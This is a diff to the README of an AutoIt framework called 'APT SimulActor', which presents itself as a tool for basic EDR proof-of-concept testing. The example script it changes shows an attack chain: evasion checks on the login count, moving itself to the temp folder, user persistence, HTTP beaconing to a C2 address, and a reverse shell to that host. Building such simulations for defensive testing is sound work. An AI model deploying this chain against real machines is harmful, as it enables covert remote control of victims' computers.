@@ -16,34 +16,32 @@ APT SimulActor is a little framework based on AutoIT libraries for basic EDR POC
 #include "libs/settings.au3"
 #include "libs/network.au3"
 #include "libs/info.au3"
-#include "libs/files.au3"
 #include "libs/misc.au3"
 
 $victim = "john"
-$c2server = "192.168.0.1"
-$c2port = "432"
+$c2_ip = "192.168.231.106"
+$c2_port = "444"
+$timer = 60
 
-if isRunningFromTemp() Then
+init()
 
-   SetPersistent4CurrentUser()
+if InternetCheck() Then
 
-   ReverseShell($c2server, $c2port)
+   If numberOfLogins(whoami()) > 2 Then
 
-Else
+	  Move2Temp()
 
-   if AmIusername($victim) Then
+	  SetPersistent4CurrentUser()
 
-	  if InternetCheck() Then
+	  While $timer > 0
 
-		 if DetectMouseMoving() Then
+		 HttpPost($c2_ip, "Timer:", $timer)
+		 Sleep(1000)
+ 		 $timer = $timer - 1
 
-			MessageBox("Debug","Hi!")
+	  WEnd
 
-			CopyTempRun()
-
-		 EndIf
-
-	  EndIf
+	  ReverseShell($c2_ip, $c2_port)
 
    EndIf
 
@@ -55,4 +53,3 @@ EndIf
 ## Prerequisites
 
 AutoIt Downloads [link](https://www.autoitscript.com/site/autoit/downloads/)
-
